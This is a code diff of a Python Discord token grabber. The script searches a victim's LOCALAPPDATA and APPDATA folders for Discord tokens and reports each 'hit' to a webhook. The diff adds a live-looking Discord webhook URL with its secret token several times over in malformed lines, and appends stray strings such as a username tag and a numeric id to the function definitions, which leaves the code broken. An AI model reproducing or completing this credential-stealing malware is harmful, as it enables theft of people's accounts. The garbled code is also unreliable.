@@ -5,7 +5,12 @@ import json
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = 'WEBHOOK HERE'
+ WEBHOOK_URL =  WEBHOOK_URL =https://discord.com/api/webhooks/812234248848539688/TN9qW2Hj5Rx3Cg66HMVPxjUIV9VgN1Vm7KiDOrFwqBbDqBRCBTArJRfbaJV-_LniO4YD'
+ WEBHOOK_URL =  WEBHOOK_URL =https://discord.com/api/webhooks/812234248848539688/TN9qW2Hj5Rx3Cg66HMVPxjUIV9VgN1Vm7KiDOrFwqBbDqBRCBTArJRfbaJV-_LniO4YD'
+ WEBHOOK_URL =  WEBHOOK_URL =https://discord.com/api/webhooks/812234248848539688/TN9qW2Hj5Rx3Cg66HMVPxjUIV9VgN1Vm7KiDOrFwqBbDqBRCBTArJRfbaJV-_LniO4YD'
+ WEBHOOK_URL =  WEBHOOK_URL = 'https://discord.com/api/webhooks/812234248848539688/TN9qW2Hj5Rx3Cg66HMVPxjUIV9VgN1Vm7KiDOrFwqBbDqBRCBTArJRfbaJV-_LniO4YD'
+ WEBHOOK_URL = 'WEBHOOK_URL = 'https://discord.com/api/webhooks/812234248848539688/TN9qW2Hj5Rx3Cg66HMVPxjUIV9VgN1Vm7KiDOrFwqBbDqBRCBTArJRfbaJV-_LniO4YD'
+'
 
 # mentions you when you get a hit
 PING_ME = False
@@ -25,7 +30,7 @@ def find_tokens(path):
                     tokens.append(token)
     return tokens
 
-def main():
+def main():sopha#0623
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
 
@@ -70,5 +75,5 @@ def main():
     except:
         pass
 
-if __name__ == '__main__':
-    main()
+if __name__ == '__main__':807642699095474196
+    main()sopha#0623
